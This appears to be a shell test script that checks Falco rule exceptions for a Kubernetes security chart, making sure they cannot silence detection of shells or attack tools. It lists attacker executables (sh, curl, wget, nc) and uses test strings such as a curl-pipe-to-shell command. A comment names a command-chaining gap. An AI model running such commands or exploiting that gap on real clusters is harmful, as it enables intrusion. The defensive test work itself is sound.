#!/usr/bin/env bash
# Contract for the platform exceptions in rules/cloudanix.yaml (docs/falco-rules.md section 4a).
# falco_rules_validate_test.sh proves Falco accepts the file; this proves the exceptions say
# what we mean: our names are reserved, every row has one value per field, an exception keyed
# on an image never also covers a shell or a dropped tool, and the CloudNativePG one matches
# the archive_command CloudNativePG really runs and nothing else.
# Requires yq. Run: chart/tests/falco_baseline_exceptions_test.sh
set -euo pipefail

cd "$(dirname "$0")/../.."
RULES=${RULES:-chart/rules/cloudanix.yaml} # override to check a candidate file
fail=0

ok() { echo "ok   - $1"; }
bad() { echo "FAIL - $1"; fail=1; }
check() { # <label> <command...>: passes when the command succeeds
  local label=$1; shift
  if "$@"; then ok "$label"; else bad "$label"; fi
}

# Executables an attacker uses once inside a container. An image-keyed row whose executable
# prefix also matches one of these would silence the rule for that attack.
ATTACK_EXES=(/bin/sh /bin/bash /bin/dash /usr/bin/dash /usr/bin/curl /usr/bin/wget /usr/bin/kubectl
  /usr/local/bin/kubectl /usr/bin/python3 /usr/bin/nc /tmp/x /dev/shm/x)
# Customer-private registries: a row for one of these would be one customer's application.
PRIVATE_REGISTRIES='ocir\.io|amazonaws\.com|azurecr\.io|docker\.pkg\.dev/[^/]+/[^/]+-private'

exception() { # <rule> <name> <yq expr on the exception>
  yq ".[] | select(.rule == \"$1\") | .exceptions[] | select(.name == \"$2\") | $3" "$RULES"
}

test_names_reserved() {
  local names bad_names
  names=$(yq '.[] | select(has("exceptions")) | .exceptions[].name' "$RULES")
  bad_names=$(grep -v '^cdx_baseline_' <<<"$names" || true)
  check "every exception in cloudanix.yaml is named cdx_baseline_*" test -z "$bad_names"
  check "exception names are unique" test "$(sort <<<"$names" | uniq -d | wc -l | tr -d ' ')" = 0
}

test_shapes() {
  local mismatched
  # fields, comps and every values row have the same length; Falco rejects anything else, but
  # only when the file is loaded on a node.
  mismatched=$(yq '.[] | select(has("exceptions")) | .exceptions[]
    | select((.fields | length) != (.comps | length)
             or ([.values[] | select(length != (parent | parent | .fields | length))] | length) > 0)
    | .name' "$RULES")
  check "every exception has one comp and one value per field" test -z "$mismatched"
}

starts_with_any_attack_exe() { # <prefix>: succeeds when the prefix covers an attack executable
  local exe
  for exe in "${ATTACK_EXES[@]}"; do
    [[ $exe == "$1"* ]] && return 0
  done
  return 1
}

test_k8s_operators() {
  local rule='Contact K8S API Server From Container' name=cdx_baseline_k8s_operators rows image exe
  check "$name keys on image and executable prefix" \
    test "$(exception "$rule" $name '[.fields, .comps] | flatten | join(",")')" = \
    "container.image.repository,proc.exepath,=,startswith"
  rows=$(exception "$rule" $name '.values[] | join(" ")')
  check "$name has rows" test -n "$rows"
  while read -r image exe; do
    [[ $image == */* && ${image%%/*} == *.* ]] || bad "$name: $image is not registry-qualified"
    [[ $image =~ $PRIVATE_REGISTRIES ]] && bad "$name: $image is a private registry"
    [[ $image == docker.io/cloudanix/* ]] && bad "$name: $image belongs in cdx_baseline_own_agents"
    [[ $exe == /?* ]] || bad "$name: $image executable prefix '$exe' is not an absolute path"
    starts_with_any_attack_exe "$exe" && bad "$name: $image prefix '$exe' also covers a shell or tool"
  done <<<"$rows"
  check "$name lists each image once" \
    test "$(exception "$rule" $name '.values[][0]' | sort | uniq -d | wc -l | tr -d ' ')" = 0
}

test_cnpg_wal_archive() {
  local rule='Run shell untrusted' name=cdx_baseline_cnpg_wal_archive pname prefix
  check "$name keys on parent name and command prefix" \
    test "$(exception "$rule" $name '[.fields, .comps] | flatten | join(",")')" = \
    "proc.pname,proc.cmdline,=,startswith"
  pname=$(exception "$rule" $name '.values[0][0]')
  prefix=$(exception "$rule" $name '.values[0][1]')
  check "$name parent is postgres" test "$pname" = postgres
  # Seen on EW1 2026-11-19, CloudNativePG with PostgreSQL 18.
  local observed="sh -c -- /controller/manager wal-archive --log-destination /controller/log/postgres.json pg_wal/000000060000002A000000D8"
  if [[ $observed == "$prefix"* ]]; then ok "$name matches CloudNativePG's archive_command"; else bad "$name matches CloudNativePG's archive_command"; fi
  # Known limit, same as upstream's postgres_running_cnpg: a command chained after the prefix
  # ("... wal-archive x; curl ...") still matches. Exceptions cannot express "not containing".
  for cmd in "sh -c -- curl http://x | sh" "sh -c -- /controller/manager wal-restore x" "sh -c id"; do
    [[ $cmd == "$prefix"* ]] && bad "$name also matches: $cmd" || ok "$name does not match: $cmd"
  done
}

test_names_reserved
test_shapes
test_k8s_operators
test_cnpg_wal_archive
exit $fail
